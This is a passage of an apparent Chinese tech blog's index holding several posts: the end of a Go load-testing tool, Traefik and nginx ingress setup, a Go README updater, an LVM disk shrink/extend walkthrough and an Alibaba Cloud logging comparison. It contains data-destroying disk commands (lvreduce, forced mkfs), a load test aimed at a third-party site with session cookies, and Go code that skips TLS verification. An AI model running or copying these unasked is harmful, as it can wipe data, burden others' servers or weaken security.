maliyun_temporary_console0=1AbLByOMHeZe3G41KYd5WWZvrM%2BGErkaLcWfBbgveKA9ifboArprPASvFUUfhwHtt44qsDwVqMk8Wkdr1F5LccYk2mPCZJiXb0q%2Bllj5u3SQGQurtyPqnG489y%2FkoA%2FEvOwsXJTvXTFQPK%2BGJD4FJg%3D%3D; cna=L3Q5F8cHDGgCAXL3r8fEZtdU; isg=BFNThsmSCcgX-sUcc5Jo2s2T4tF9COfKYi8g9wVwr3KphHMmjdh3GrHFvPTqJD_C; l=eBaceXLnQGBjstRJBOfwPurza77OSIRAguPzaNbMiT5POw1B5WAlWZbqyNY6C3GVh6lwR37EODnaBeYBc3K-nxvOu9eFfGMmn\u0026#39; \\  --data-raw \u0026#39;adPlanQueryParam=%7B%22adZone%22%3A%7B%22positionList%22%3A%5B%7B%22positionId%22%3A83%7D%5D%7D%2C%22requestId%22%3A%2217958651-f205-44c7-ad5d-f8af92a6217a%22%7D\u0026#39; \\  --compressed Docker Use $ docker pull louisehong/stress $ docker run --rm louisehong/stress -c 1 -n 1 -d -u 'https://page.aliyun.com/delivery/plan/list' \\ -H 'authority: page.aliyun.com' \\ -H 'accept: application/json, text/plain, */*' \\ -H 'content-type: application/x-www-form-urlencoded' \\ -H 'origin: https://cn.aliyun.com' \\ -H 'sec-fetch-site: same-site' \\ -H 'sec-fetch-mode: cors' \\ -H 'sec-fetch-dest: empty' \\ -H 'referer: https://cn.aliyun.com/' \\ -H 'accept-language: zh-CN,zh;q=0.9' \\ -H 'cookie: aliyun_choice=CN; JSESSIONID=J8866281-CKCFJ4BUZ7GDO9V89YBW1-KJ3J5V9K-GYUW7; maliyun_temporary_console0=1AbLByOMHeZe3G41KYd5WWZvrM%2BGErkaLcWfBbgveKA9ifboArprPASvFUUfhwHtt44qsDwVqMk8Wkdr1F5LccYk2mPCZJiXb0q%2Bllj5u3SQGQurtyPqnG489y%2FkoA%2FEvOwsXJTvXTFQPK%2BGJD4FJg%3D%3D; cna=L3Q5F8cHDGgCAXL3r8fEZtdU; isg=BFNThsmSCcgX-sUcc5Jo2s2T4tF9COfKYi8g9wVwr3KphHMmjdh3GrHFvPTqJD_C; l=eBaceXLnQGBjstRJBOfwPurza77OSIRAguPzaNbMiT5POw1B5WAlWZbqyNY6C3GVh6lwR37EODnaBeYBc3K-nxvOu9eFfGMmn' \\ --data-raw 'adPlanQueryParam=%7B%22adZone%22%3A%7B%22positionList%22%3A%5B%7B%22positionId%22%3A83%7D%5D%7D%2C%22requestId%22%3A%2217958651-f205-44c7-ad5d-f8af92a6217a%22%7D' \\ --compressed  项目结构  ├── build.sh ├── cmd │ ├── dispose.go │ ├── root.go │ └── version.go ├── main.go ├── Makefile ├── pkg │ ├── http_client.go │ ├── websocket_client.go │ ├── http.go │ ├── request.go │ ├── statistics.go │ ├── var.go │ ├── verify_http.go │ ├── verify_websocket.go │ └── websocket.go ├── README.md └── utils ├── curl.txt ├── utils.go └── utils_test.go 4.参考文献 性能测试工具\n性能测试常见名词解释\n性能测试名词解释\nPV、TPS、QPS是怎么计算出来的？\n超实用压力测试工具－ab工具\ngo-stress-testing\n","permalink":"https://www.fenghong.tech/blog/tools/stress-testing-by-golang/","tags":["stress","testing"],"title":"压力测试stress介绍"},{"categories":["kubernetes"],"contents":"[TOC]\n Traefik 是一个边缘路由器，是你整个平台的大门，拦截并路由每个传入的请求：它知道所有的逻辑和规则，这些规则确定哪些服务处理哪些请求；传统的反向代理需要一个配置文件，其中包含路由到你服务的所有可能路由，而 Traefik 会实时检测服务并自动更新路由规则，可以自动服务发现。\n 基本说明 首先，当启动 Traefik 时，需要定义 entrypoints（入口点），然后，根据连接到这些 entrypoints 的路由来分析传入的请求，来查看他们是否与一组规则相匹配，如果匹配，则路由可能会将请求通过一系列中间件转换过后再转发到你的服务上去。在了解 Traefik 之前有几个核心概念我们必须要了解：\n Providers 用来自动发现平台上的服务，可以是编排工具、容器引擎或者 key-value 存储等，比如 Docker、Kubernetes、File Entrypoints 监听传入的流量（端口等…），是网络入口点，它们定义了接收请求的端口（HTTP 或者 TCP）。 Routers 分析请求（host, path, headers, SSL, …），负责将传入请求连接到可以处理这些请求的服务上去。 Services 将请求转发给你的应用（load balancing, …），负责配置如何获取最终将处理传入请求的实际服务。 Middlewares 中间件，用来修改请求或者根据请求来做出一些判断（authentication, rate limiting, headers, \u0026hellip;），中间件被附件到路由上，是一种在请求发送到你的服务之前（或者在服务的响应发送到客户端之前）调整请求的一种方法。  安装 我这里安装使用的镜像为traefik:v2.2.7, kuberbetes集群信息如下:\n$ kubectl get nodes -owide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME dev-k8s-master Ready master 149m v1.18.0 192.168.160.243 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 4.4.228-2.el7.elrepo.x86_64 docker://19.3.12 dev-k8s-node Ready \u0026lt;none\u0026gt; 149m v1.18.0 192.168.160.244 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 4.4.228-2.el7.elrepo.x86_64 docker://19.3.9 安装 Traefik 到 Kubernetes 集群中的资源清单文件我这里提前准备好了，直接执行下面的安装命令即可： 主要是crd，dashboard， traefik deployment， rbac四个文件.\n$ wget https://www.fenghong.tech/k8strain/traefik/all.yaml $ kubectl apply -f all.yaml 我们这里是通过命令行参数来做的静态配置：\nargs: - --entrypoints.web.address=:80 - --entrypoints.tcpep.address=:8000 - --entrypoints.udpep.address=:9000/udp - --log.level=DEBUG - --api - --api.insecure - --providers.kubernetescrd - --providers.kubernetesingress 其中前三项配置是来定义 web 和 tcp和upd 这入口点的，--api 开启,就会创建一个名为 api@internal 的特殊 service，在 dashboard 中可以直接使用这个 service 来访问，然后其他比较重要的就是开启 kubernetesingress 和 kubernetescrd 这两个 provider。这边我忽略了https的配置. 如果要配置ssl请参考其他文章.\n部署完成后我们可以通过在本地 /etc/hosts 中添加上域名 traefik.domain.com 的映射即可访问 Traefik 的 Dashboard 页面了：\n注: 这个是解析到 traefik正在运行的node节点ip\n定义一个IngressRoute对象: 只用把域名解析到 traefik正在运行的node节点ip即可.\n--- apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: namespace: default name: web-hello-world annotations: traefik.ingress.kubernetes.io/router.entrypoints: web spec: routes: - match: Host(`helloworld.fenghong.tech`) kind: Rule services: - name: web-hello-world port: 8000 一个helloword-deployment完整示例\n$ kubectl apply -f https://www.fenghong.tech/k8strain/traefik/test-helloworld.yaml 通过 entryPoints 指定了我们这个应用的入口点是 web，也就是通过 80 端口访问，然后访问的规则就是要匹配 helloworld.fenghong.tech 这个域名，才会被 web-hello-world 这个 Service 所匹配。我们可以直接创建上面的几个资源对象，然后对域名做对应的解析后，就可以访问应用了：\n参考  https://www.qikqiak.com/post/traefik-2.1-101/  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-traefik/","tags":["kubernetes","ingress"],"title":"kubernetes traefik简单应用"},{"categories":["tools"],"contents":"[TOC]\n 创建一个 和自己github id同名的 repositories，修改你想展示的文字到README.md,然后回到你的首页就有了。然后有大佬已经有写一些插件直接用，可以展示github的一些汇总信息，start数、commit数、issues数等\n 效果图 可以上我的github查看一下.\n编写自动更新源码 采用golang进行自动发布. blog采用的是hugo生成。 采用gorequest获取blog生成的index.json. 然后进行截取所需信息即可.\npackage main import ( \u0026quot;bytes\u0026quot; \u0026quot;crypto/tls\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;github.com/parnurzeal/gorequest\u0026quot; \u0026quot;io/ioutil\u0026quot; \u0026quot;log\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;time\u0026quot; ) type blog struct { Categories []string `json:\u0026quot;categories\u0026quot;` Tags []string `json:\u0026quot;tags\u0026quot;` Permalink string `json:\u0026quot;permalink\u0026quot;` Title string `json:\u0026quot;title\u0026quot;` Contents string `json:\u0026quot;contents\u0026quot;` } type Blogs []struct { collet []blog } var ( githubUserName = \u0026quot;oldthreefeng\u0026quot; // 取最新的6篇文章 max = 5 ) func main() { res := make([]blog, 0) response, data, errs := gorequest.New().TLSClientConfig(\u0026amp;tls.Config{InsecureSkipVerify: true}). Get(\u0026quot;https://www.fenghong.tech/index.json\u0026quot;).EndStruct(\u0026amp;res) if errs != nil || http.StatusOK != response.StatusCode { log.Fatal(errs, data) } buf := \u0026amp;bytes.Buffer{} buf.WriteString(\u0026quot;\\n\\n\u0026quot;) cstSh, _ := time.LoadLocation(\u0026quot;Asia/Shanghai\u0026quot;) updated := time.Now().In(cstSh).Format(\u0026quot;2006-01-02 15:04:05\u0026quot;) buf.WriteString(\u0026quot;### 我的近期动态\\n\\n⭐️ Star [个人主页](https://github.com/\u0026quot; + githubUserName + \u0026quot;/\u0026quot; + githubUserName + \u0026quot;) 后会自动更新，最近更新时间：`\u0026quot; + updated + \u0026quot;`\\n\\n\u0026quot;) for k, v := range res { if k \u0026gt; max { break } url := v.Permalink title := v.Title buf.WriteString(\u0026quot;📝 * \u0026quot; + \u0026quot; [\u0026quot; + title + \u0026quot;](\u0026quot; + url + \u0026quot;)\\n\\n\u0026quot; + \u0026quot; \\n\u0026quot;) } buf.WriteString(\u0026quot;\\n\\n\u0026quot;) fmt.Println(buf.String()) readme, err := ioutil.ReadFile(\u0026quot;README.md\u0026quot;) if nil != err { log.Fatalf(\u0026quot;read README.md failed: %s\u0026quot;, data) } startFlag := []byte(\u0026quot;\u0026lt;!--events start --\u0026gt;\u0026quot;) beforeStart := readme[:bytes.Index(readme, startFlag)+len(startFlag)] newBeforeStart := make([]byte, len(beforeStart)) copy(newBeforeStart, beforeStart) endFlag := []byte(\u0026quot;\u0026lt;!--events end --\u0026gt;\u0026quot;) afterEnd := readme[bytes.Index(readme, endFlag):] newAfterEnd := make([]byte, len(afterEnd)) copy(newAfterEnd, afterEnd) newReadme := append(newBeforeStart, buf.Bytes()...) newReadme = append(newReadme, newAfterEnd...) if err := ioutil.WriteFile(\u0026quot;README.md\u0026quot;, newReadme, 0644); nil != err { log.Fatalf(\u0026quot;write README.md failed: %s\u0026quot;, data) } } 写完之后. 执行即可.\n$ go run main.go 我的README模板如下. \u0026lt;!--events start --\u0026gt; , \u0026lt;!--events end --\u0026gt;之间的都是go生成文章链接的.\nCurrently working on [JUNHSUE](https://www.junhsue.com/) Read [my blog](https://www.fenghong.tech/) or add my WeChat account： \u0026lt;div align=\u0026quot;center\u0026quot;\u0026gt; \u0026lt;p\u0026gt; \u0026lt;img src=\u0026quot;https://www.fenghong.tech/images/images/wechat-qrcode.png\u0026quot; width=\u0026quot;300\u0026quot; alt=\u0026quot;接引道人\u0026quot; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ### 我在 GitHub 上的统计 ![louis's github stats](https://github-readme-stats.vercel.app/api?username=oldthreefeng\u0026amp;show_icons=true\u0026amp;hide_border=false) \u0026lt;!--events start --\u0026gt; \u0026lt;!--events end --\u0026gt; 💗🌙💗🌙- [www.fenghong.tech](https://www.fenghong.tech) ","permalink":"https://www.fenghong.tech/blog/technology/github-profile/","tags":["github"],"title":"github个人信息展示"},{"categories":["kubernetes"],"contents":"[TOC]\n 可以直接在 Ingress 中配置 rewrite. 你需要在annotation中, 增加 nginx.org/rewrites即可。\n 语法如下 nginx.org/rewrites: \u0026quot;serviceName=service1 rewrite=rewrite1[;serviceName=service2 rewrite=rewrite2;...]\u0026quot; 例子 需求: 有两个uri需要进行rewrite.\n访问 https://ent-pc-test.fenghong.tech/api/abc 跳转至 https://ent-pc-test.fenghong.tech/huohua-ent-admin/abc\n访问 https://ent-pc-test.fenghong.tech/api/public/abc 跳转至 https://ent-pc-test.fenghong.tech/huohua-ent-api/api/abc\nyaml文件如下， 注意pathType: ImplementationSpecific是kubernetes集群v1.18的新特性。 低版本请删除该行。\n$ cat ingress.yaml apiVersion: extensions/v1beta1 kind: Ingress metadata: name: web-huohua-ent-pc namespace: huohua annotations: k8s.kuboard.cn/displayName: huohua-ent-pc k8s.kuboard.cn/workload: web-huohua-ent-pc nginx.org/rewrites: \u0026quot;serviceName=svc-huohua-ent-api rewrite=/huohua-ent-api/api/;serviceName=svc-huohua-ent-admin rewrite=/huohua-ent-admin/\u0026quot; spec: rules: - host: ent-pc-test.fenghong.tech http: paths: - backend: serviceName: web-huohua-ent-pc servicePort: huohua-ent-pc path: / pathType: ImplementationSpecific ## v1.18的新特性。低版本请删除 - backend: serviceName: svc-huohua-ent-api servicePort: ent-api path: /api/public/ pathType: ImplementationSpecific - backend: serviceName: svc-huohua-ent-admin servicePort: ent-admin path: /api/ pathType: ImplementationSpecific 当需要访问serviceName为svc-huohua-ent-admin时. rewrite规则生效如下:\n  访问/api/ -\u0026gt; /huohua-ent-admin/\n  访问/api/abc-\u0026gt; /huohua-ent-admin/abc\n  当需要访问的serviceName为svc-huohua-ent-api时, rewrite规则生效如下:\n /api/public/ -\u0026gt; /huohua-ent-api/api/ /api/public/abc -\u0026gt; /huohua-ent-api/api/abc  更新 $ kubectl apply -f ingress.yaml $ kubectl describe ing web-huohua-ent-pc -n huohua Name: web-huohua-ent-pc Namespace: huohua Address: Default backend: default-http-backend:80 (\u0026lt;error: endpoints \u0026quot;default-http-backend\u0026quot; not found\u0026gt;) Rules: Host Path Backends ---- ---- -------- ent-pc-test.fenghong.tech / web-huohua-ent-pc:huohua-ent-pc (100.70.101.191:80) /api/public/ svc-huohua-ent-api:ent-api (100.70.101.138:8080) /api/ svc-huohua-ent-admin:ent-admin (100.70.101.172:8081) Annotations: k8s.kuboard.cn/displayName: huohua-ent-pc k8s.kuboard.cn/workload: web-huohua-ent-pc nginx.org/rewrites: serviceName=svc-huohua-ent-api rewrite=/huohua-ent-api/api/;serviceName=svc-huohua-ent-admin rewrite=/huohua-ent-admin/ Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal AddedOrUpdated 3m25s (x8 over 3d3h) nginx-ingress-controller Configuration for huohua/web-huohua-ent-pc was added or updated Normal AddedOrUpdated 3m25s (x8 over 3d3h) nginx-ingress-controller Configuration for huohua/web-huohua-ent-pc was added or updated Normal AddedOrUpdated 3m25s (x8 over 3d3h) nginx-ingress-controller Configuration for huohua/web-huohua-ent-pc was added or updated 参考  nginx-ingress-rewrites  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-ingress-rewrite/","tags":["kubernetes","ingress"],"title":"kubernetes ingress rewrite配置"},{"categories":["ops"],"contents":"[TOC]\n 背景: 公司安装centos7.7系统时, 分配的/目录才50G, 分配/home家目录800G. 部署应用后, 经常收到磁盘报警. 因此有了这篇文章. 使用lvreduce减少磁盘容量的时候. 这个是个危险操作, 注意备份文件!!!\n 查看目前的磁盘分配情况, 可以清楚的看到根目录太小. 且使用的是lvm磁盘.\n$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 931.5G 0 disk ├─sda1 8:1 0 1G 0 part /boot └─sda2 8:2 0 930.5G 0 part ├─centos-root 253:0 0 50G 0 lvm / ├─centos-swap 253:1 0 7.9G 0 lvm └─centos-home 253:2 0 872.6G 0 lvm /home sr0 11:0 1 1024M 0 rom 扩容方案一 减少/home盘 首先umount卸载我们的lvm盘. 最好是增加磁盘, 不到必要时刻, 不要缩减磁盘.\n$ umount /home umount: /home: target is busy. (In some cases useful info about processes that use the device is found by lsof(8) or fuser(1)) ## 这个是有程序正在使用. 查看文件是由哪些程序在用. $ lsof /home ## 处理好程序使用问题, 再次卸载 $ umount /home ## 确定已经卸载. $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 931.5G 0 disk ├─sda1 8:1 0 1G 0 part /boot └─sda2 8:2 0 930.5G 0 part ├─centos-root 253:0 0 50G 0 lvm / ├─centos-swap 253:1 0 7.9G 0 lvm └─centos-home 253:2 0 872.6G 0 lvm sr0 11:0 1 1024M 0 rom 我们可以使用lvreduce减少/home家目录的大小. 使用lvdisplay查看具体的细节.\n使用lvreduce减少磁盘容量的操作. 这个是个危险操作, 操作之前注意备份文件!!!\n$ lvdisplay --- Logical volume --- LV Path /dev/centos/swap LV Name swap VG Name centos LV UUID LCp1Rl-0Gsh-9EXw-dStO-hYyS-FbYU-X42SzS LV Write Access read/write LV Creation host, time localhost, 2019-12-02 21:44:39 +0800 LV Status available # open 0 LV Size \u0026lt;7.88 GiB Current LE 2016 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 253:1 --- Logical volume --- LV Path /dev/centos/home LV Name home VG Name centos LV UUID 0gSQDa-O00q-ktow-eKCT-GYTD-DOEi-1zF8on LV Write Access read/write LV Creation host, time localhost, 2019-12-02 21:44:40 +0800 LV Status available # open 0 LV Size \u0026lt;872.63 GiB Current LE 223393 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 253:2 --- Logical volume --- LV Path /dev/centos/root LV Name root VG Name centos LV UUID EYr2b1-7k7F-rLGl-B9sf-N4Rf-3Q33-rTuhCO LV Write Access read/write LV Creation host, time localhost, 2019-12-02 21:44:59 +0800 LV Status available # open 1 LV Size 50.00 GiB Current LE 12800 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 253:0 ## 使用lvreduce减少磁盘容量. 这个是个危险操作, 注意备份文件!!! ## 使用lvreduce减少磁盘容量. 这个是个危险操作, 注意备份文件!!! ## 使用lvreduce减少磁盘容量. 这个是个危险操作, 注意备份文件!!! ## 这个是减少至80G. $ lvreduce -L 80G /dev/centos/home WARNING: Reducing active logical volume to 80.00 GiB. THIS MAY DESTROY YOUR DATA (filesystem etc.) Do you really want to reduce centos/home? [y/n]: y Size of logical volume centos/home changed from 800.00 GiB (204800 extents) to 80.00 GiB (20480 extents). Logical volume centos/home successfully resized. 使用vgdisplay查看我们的lvm还有多少FREE空间, 由于上面从800G减少至80G. 这边可以看到我们的vg的空间释放了. 有792.63 GiB.\n$ vgdisplay --- Volume group --- VG Name centos System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 6 VG Access read/write VG Status resizable MAX LV 0 Cur LV 3 Open LV 1 Max PV 0 Cur PV 1 Act PV 1 VG Size \u0026lt;930.51 GiB PE Size 4.00 MiB Total PE 238210 Alloc PE / Size 35296 / \u0026lt;137.88 GiB Free PE / Size 202914 / 792.63 GiB VG UUID I96Nn6-dD0r-uDci-YbxF-owCn-vxJ6-ieviLy 增加/目录容量 使用lvextend增加我们的/目录. 这个时候, 我们的根目录已经增加到了最大了.\n$ lvextend -l +100%FREE /dev/mapper/centos-root Size of logical volume centos/root changed from 50.00 GiB (12800 extents) to 842.63 GiB (215714 extents). Logical volume centos/root successfully resized. 使用命令查看, 发现获取的目录依旧是50G, 没有变化, 这里需要用xfs_growfs命令进行, redhat使用resize2fs\n$ df -h Filesystem Size Used Avail Use% Mounted on devtmpfs 16G 0 16G 0% /dev tmpfs 16G 0 16G 0% /dev/shm tmpfs 16G 2.0M 16G 1% /run tmpfs 16G 0 16G 0% /sys/fs/cgroup /dev/mapper/centos-root 50G 21G 30G 41% / /dev/sda1 1014M 223M 792M 22% /boot # for centos $ xfs_growfs /dev/mapper/centos-root meta-data=/dev/mapper/centos-root isize=512 agcount=68, agsize=3276800 blks = sectsz=4096 attr=2, projid32bit=1 = crc=1 finobt=0 spinodes=0 data = bsize=4096 blocks=220891136, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal bsize=4096 blocks=6400, version=2 = sectsz=4096 sunit=1 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 # for redhat $ resize2fs /dev/mapper/centos-root resize2fs 1.42.9 (28-Dec-2013) resize2fs: Bad magic number in super-block while trying to open /dev/mapper/centos-root Couldn't find valid filesystem superblock. 意外情况 我们lvreduce的磁盘挂载出现问题. 这里我只能重新格式化了, 提醒大家使用lvm扩缩容先备份文件. 特别是要减少的磁盘文件.\n$ mount /dev/mapper/centos-home /home/ mount: /dev/mapper/centos-home: can't read superblock $ xfs_repair /dev/mapper/centos-home ..... couldn't verify primary superblock - attempted to perform I/O beyond EOF ..... 只能重新格式化了\n## 格式化文件系统. 请注意操作前备份. $ mkfs.xfs -f /dev/mapper/centos-home $ mount /dev/mapper/centos-home /home/ 扩容方案二 直接增加一块盘, 最快捷了, 这理添加了一块/dev/sdb\n$ fdisk /dev/sdb lvm是需要更改类型的. t -\u0026gt; 8e WARNING: If you have created or modified any DOS 6.xpartitions, please see the fdisk manual page for additionalinformation. Changed type of partition 'FAT12' to 'Linux LVM' Device Boot Start End Blocks Id System /dev/sdb1 2048 83886079 41942016 8e Linux LVM [root@dev-k8s-master ~]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 20G 0 disk ├─sda1 8:1 0 1G 0 part /boot └─sda2 8:2 0 19G 0 part ├─centos-root 253:0 0 17G 0 lvm / └─centos-swap 253:1 0 2G 0 lvm sdb 8:16 0 40G 0 disk └─sdb1 8:17 0 40G 0 part sr0 11:0 1 942M 0 rom 创建pv\n$ pvcreate /dev/sdb1 Physical volume \u0026quot;/dev/sdb1\u0026quot; successfully created. $ pvs PV VG Fmt Attr PSize PFree /dev/sda2 centos lvm2 a-- \u0026lt;19.00g 0 /dev/sdb1 lvm2 --- \u0026lt;40.00g \u0026lt;40.00g 扩容vg\n$ vgextend centos /dev/sdb1 Volume group \u0026quot;centos\u0026quot; successfully extended $ vgs VG #PV #LV #SN Attr VSize VFree centos 2 2 0 wz--n- 58.99g \u0026lt;40.00g 扩容lvm并且resize\n$ lvextend -l +100%FREE /dev/mapper/centos-root Size of logical volume centos/root changed from \u0026lt;17.00 GiB (4351 extents) to 56.99 GiB (14590 extents). Logical volume centos/root successfully resized. $ xfs_growfs /dev/mapper/centos-root meta-data=/dev/mapper/centos-root isize=512 agcount=4, agsize=1113856 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0 spinodes=0 data = bsize=4096 blocks=4455424, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 data blocks changed from 4455424 to 14940160 查看\n[root@dev-k8s-master ~]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 20G 0 disk ├─sda1 8:1 0 1G 0 part /boot └─sda2 8:2 0 19G 0 part ├─centos-root 253:0 0 57G 0 lvm / └─centos-swap 253:1 0 2G 0 lvm sdb 8:16 0 40G 0 disk └─sdb1 8:17 0 40G 0 part └─centos-root 253:0 0 57G 0 lvm / sr0 11:0 1 942M 0 rom 记录一下~\n","permalink":"https://www.fenghong.tech/blog/ops/lvm-reduce-extend/","tags":["lvm"],"title":"lvm磁盘在线扩缩容"},{"categories":["ops"],"contents":"[TOC]\n一 现状与需求 现状与问题:  日志文件分散在各个应用服务器，开发人员必须远程登录才能查看日志，不利于服务器安全管控，加大生产服务器的风险； 服务器上各项目日志配置很随意，文件分布杂乱，没有统一的规范和管理； 日志文件占用服务器大量的硬盘空间，如不及时清理会发生硬盘占满，影响系统的正常运行; 对于超过百兆的日志文件根本没法打开和关键字搜索，不利于问题的快速定位和排查; 集群和分布式的系统需要查看多个服务器的日志; 日志保存的时间不统一，不能长时间保存日志.  需求说明与分析  不需要开发人员登录生产服务器就能查看日志； 统一规范日志的配置和输出格式； 实时的将日志文件从服务器中迁出； 提供日志的检索和统计分析的平台；  二 建设目标 ​\t搭建支持高并发高可靠的日志分析平台，方便开发人员快速的检索日志，排查问题, 同时提供友好的分析和统计的界面。\n三 系统设计 技术选型  阿里云 日志服务（Log Service，简称 SLS）是针对日志类数据的一站式服务，在阿里巴巴集团经历大量大数据场景锤炼而成。您无需开发就能快捷完成日志数据采集、消费、投递以及查询分析等功能，提升运维、运营效率，建立DT 时代海量日志处理能力。 自建ELK日志收集系统  本次选型参考,考虑多方因素, 最终选择阿里云日志服务.\n系统架构 日志服务的架构如下图所示。\n​ 图 1. 产品架构 ​ \nLogtail ​ 帮助您快速收集日志的Agent。其特点如下所示：\n 基于日志文件、无侵入式的收集日志  只读取文件。 日志文件无侵入。   安全、可靠  支持文件轮转不丢失数据。 支持本地缓存。 网络异常重试。   方便管理  Web端操作。 可视化配置。   完善的自我保护  实时监控进程CPU、内存消耗。 限制使用上限。    前端服务器 ​ 采用LVS + Nginx构建的前端机器。其特点如下所示：\n HTTP、REST协议 水平扩展  流量上涨时可快速提高处理能力。 支持增加前端机。   高吞吐、低延时  纯异步处理，单个请求异常不会影响其他请求。 内部采用专门针对日志的Lz4压缩，提高单机处理能力，降低网络带宽。    后端服务器 ​ 后端是分布式的进程，部署在多个机器上，完成实时对Logstore数据的持久化、索引、查询以及投递至MaxCompute。整体后端服务的特点如下所示：\n 数据高安全性 :  您写入的每条日志，都会被保存3份。 任意磁盘损坏、机器宕机情况下，数据自动复制修复。   稳定服务：  进程崩溃和机器宕机时，Logstore会自动迁移。 自动负载均衡，确保无单机热点。 严格的Quota限制，防止单个用户行为异常对其他用户产生影响。   水平扩展：  以分区（Shard）为单位进行水平扩展。 用户可以按需动态增加分区来增加吞吐量。    阿里云成本优势 日志服务产品在日志处理的三种场景下具有以下成本优势：\n LogHub：  与购买云主机 + 云磁盘搭建 Kafka 相比，对于 98% 场景下用户价格有优势。对小型网站而言，成本为 kafka 的30% 以下。 提供 RESTful API，可以直接针对移动设备提供数据收集功能，节省了日志收集网关服务器的费用。 免运维，随时随地弹性扩容使用。   LogShipper：  无需任何代码/机器资源，灵活配置与丰富监控数据。 规模线性扩展 （PB级/Day），功能当前免费。   LogSearch/Analytics：  与购买云主机 + 自建 ELK 相比，成本为自建的 15% 以下，并且查询能力与数据规模有极大提升。与日志管理软件相比，能无缝支持各种流行流计算 + 离线计算框架，日志流动畅通无阻。    以下是在计费模型下，日志服务功能与自建方案的对比，仅供参考。\n日志中枢（LogHub vs Kafka）    - 关注点 LogHub 自建中间件（如Kafka）     使用 新增 无感知 需要运维动作   扩容 无感知 需要运维动作    增加备份 无感知 需要运维动作    多租户使用 隔离 可能会相互影响    费用 公网采集（10GB/天） 2 元/天 16.1 元/天   公网采集（1TB/天） 162 元/天 800 元/天    内网采集（数据量小） - -    内网采集（数据量中） - -    内网采集（数据量大） - -     日志存储与查询引擎    关注点 LogSearch ES（Lucene Based) NoSQL Hive      规模 规模 PB TB PB PB   成本 存储（元/GB *天） 0.0115 3.6 0.02 0.035   写入（元/GB） 0.35 5 0.4 0    查询（元/GB） 0 0 0.2 0.3    速度-查询 毫秒级-秒级 毫秒级-秒级 毫秒级 分钟级    速度-统计 弱+ 较强 弱 强    延时 写入-\u0026gt;可查询 实时 分钟级 实时 十分钟级    以上述测试数据为例，一天写入50GB数据（其中23GB 为实际的内容），保存90天，平均一个月的耗费。\n日志服务（LogSearch/LogAnalytics）计费规则参见按量付费，包括读写流量、索引流量、存储空间等计费项，查询功能免费。\n   计费项目 值 单价 费用（元）     读写流量 23G * 30 0.2 元/GB 138   存储空间（保存90天） 50G * 90 0.3 元/GB*Month 1350   索引流量 27G * 30 0.35 元/GB 283   总计 - - 1771    ES费用包括机器费用，及存储数据SSD云盘费用。  云盘一般可以提供高可靠性，因此我们这里不计费副本存储量。 存储盘一般需要预留15%剩余空间，防止空间写满，因此乘以一个1.15系数。     计费项目 值 单价 费用（元）     服务器 4台4核16G（三个月）（ecs.mn4.xlarge） 包年包月费用：675 元/Month 2021   存储 86 * 1.15 * 90 （这里只计算一个副本） SSD：1 元/GB*M 8901   - SATA：0.35 元/GB*M 3115    总计   5135 （SATA）12943 （SSD）    同样性能，使用LogSearch/Analytics与ELK（SSD）费用比为 13.6%。在测试过程中，我们也尝试把SSD换成SATA以节省费用（LogAnalytics与SATA版费用比为 34%），但测试发现延时会从40ms上升至150ms，在长时间读写下，查询和读写延时变得很高，无法正常工作了。\n时间成本（Time to Value） 除硬件成本外，日志服务在新数据接入、搭建新业务、维护与资源扩容成本基本为0。\n 支持各种日志处理生态，可以和Spark、Hadoop、Flink、Grafana等系统无缝对接。 在全球化部署（有20+ Region），方便拓展全球化业务。 提供30+日志接入SDK，与阿里云产品无缝打通集成。  日志服务采集和可视化可以参见如下文章，非核心功能不展开做比较。\n 采集 可视化  功能优势 全托管服务  应用性强，5分钟即可接入服务进行使用，Agent支持任意网络下数据采集。 LogHub覆盖Kafka 100%功能，提供完整监控、报警等功能数据，并支持弹性伸缩（可支持PB/Day规模），使用成本为自建50%以下。 LogSearch/Analytics 提供快速查询、仪表盘和报警功能，使用成本为自建 20%以下。 提供超过30种接入方式，与云产品 （OSS/E-MapReduce/MaxCompute/Table Store/MNS/CDN/ARMS等）、开源软件（Storm、Spark）无缝对接。  同样性能，使用LogSearch/Analytics与ELK（SSD）费用比为 13.6%。在测试过程中，我们也尝试把SSD换成SATA以节省费用（LogAnalytics与SATA版费用比为 34%），但测试发现延时会从40ms上升至150ms，在长时间读写下，查询和读写延时变得很高，无法正常工作了。\n生态丰富  LogHub 支持30多个采集端，包括Logstash、Fluent等，无论是嵌入式设备、网页、服务器、程序等都能轻松接入。在消费端，支持与Storm、Spark Streaming、云监控等对接。 LogShipper 支持丰富数据格式（TextFile、SequenceFile、Parquet等），支持自定义Partition，数据可以直接被Presto、Hive、Spark、Hadoop、E-MapReduce、MaxCompute、HybridDB、DLA等处理。 LogSearch/Analytics 查询分析语法完整、兼容SQL92、支持JDBC协议与Grafana对接。  实时性强  LogHub：写入即可消费；Logtail（采集Agent）实时采集传输，1秒内到服务端（99.9%情况）。 